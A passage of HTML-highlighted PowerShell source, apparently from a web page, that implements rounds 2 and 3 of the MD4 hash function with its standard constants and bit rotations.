</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>0</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>3</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>16</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>19</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>32</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>35</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>48</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>51</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>13</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>4</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>7</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>20</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>23</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>36</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>39</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>52</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>55</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>13</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>8</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>11</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>24</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>27</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>40</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>43</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>56</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>59</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>13</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>12</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>15</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>28</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>31</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>44</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>47</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>GG</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>60</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>63</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x5A827999</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>13</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c># Round 2 end</span>
</span></span><span class=line><span class=cl>        <span class=c># Round 3 start</span>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>0</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>3</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>32</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>35</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>16</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>19</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>48</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>51</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>15</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>8</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>11</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>40</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>43</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>24</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>27</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>56</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>59</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>15</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$A</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$A</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$B</span> <span class=n>-Y</span> <span class=nv>$C</span> <span class=n>-Z</span> <span class=nv>$D</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>4</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>7</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$D</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$D</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$A</span> <span class=n>-Y</span> <span class=nv>$B</span> <span class=n>-Z</span> <span class=nv>$C</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>36</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>39</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$C</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$C</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$D</span> <span class=n>-Y</span> <span class=nv>$A</span> <span class=n>-Z</span> <span class=nv>$B</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>20</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>23</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$B</span> <span class=p>=</span> <span class=p>[</span><span class=no>Shift</span><span class=p>]::</span><span class=n>Left</span><span class=p>((</span><span class=nv>$B</span> <span class=p>+</span> <span class=p>(</span><span class=n>HH</span> <span class=n>-X</span> <span class=nv>$C</span> <span class=n>-Y</span> <span class=nv>$D</span> <span class=n>-Z</span> <span class=nv>$A</span><span class=p>)</span> <span class=p>+</span> <span class=p>[</span><span class=no>BitConverter</span><span class=p>]::</span><span class=n>ToUInt32</span><span class=p>(</span><span class=nv>$M</span><span class=p>[(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>52</span><span class=p>)..(</span><span class=nv>$i</span> <span class=p>+</span> <span class=mf>55</span><span class=p>)],</span> <span class=mf>0</span><span class=p>)</span> <span class=p>+</span> <span class=n>0x6ED9EBA1</span><span class=p>)</span> <span class=o>-band</span> <span class=p>[</span><span class=no>uint32</span><span class=p>]::</span><span class=n>MaxValue</span><span class=p>,</span> <span class=mf>15</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
